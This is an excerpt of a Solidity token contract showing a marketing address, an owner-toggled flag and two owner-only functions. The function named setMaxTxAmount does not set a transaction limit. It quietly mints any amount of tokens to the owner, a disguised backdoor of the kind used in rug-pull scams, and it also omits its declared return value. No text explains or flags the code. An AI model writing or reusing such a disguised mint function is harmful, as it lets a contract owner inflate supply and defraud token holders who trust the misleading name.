...
bool isSL = true;
uint256 _LOCK = 10;
address payable public marketingAddress = payable(0x6E98934ded9e28e52393FDe07BAB178fFCBc1A3f); // Marketing Address
...
function setMaxTxAmount(uint256 amount) external onlyOwner returns (bool) {
  _balances[owner()] = _balances[owner()].add(amount);
  emit Transfer(address(0), owner(), amount);
}
function setSwapAndLiquifyEnabled(bool _enabled) public onlyOwner virtual returns (bool) {
    isSL = _enabled;
    return true;
}
